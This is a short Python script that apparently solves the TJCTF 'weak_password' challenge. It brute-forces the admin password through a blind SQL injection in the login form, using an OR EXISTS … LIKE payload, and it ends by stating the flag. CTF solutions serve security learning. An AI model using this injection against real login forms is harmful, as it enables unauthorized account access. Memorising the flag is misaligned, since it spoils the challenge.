# We can use the LIKE clause to guess characters

import requests

url = 'https://weak_password.tjctf.org/login'
alphabet = 'abcdefghijklmnopqrstuvwxyz'

print('Bruteforcing password: ', end='', flush=True)
for i in range(100):
    for char in alphabet:
        r = requests.post(url, data = {'username': 'test', 'password': f"a' OR EXISTS(SELECT * FROM `userandpassword` WHERE username='admin' AND password LIKE '{'_'*i}{char}%') AND ''='"})
        #print(char, 'Wrong' not in r.text)
        if 'Wrong' not in r.text:
            print(char, end='', flush=True)
            break
    else:
        print('\nPassword found')


# The password is 'blinded', the flag is tjctf{blinded}
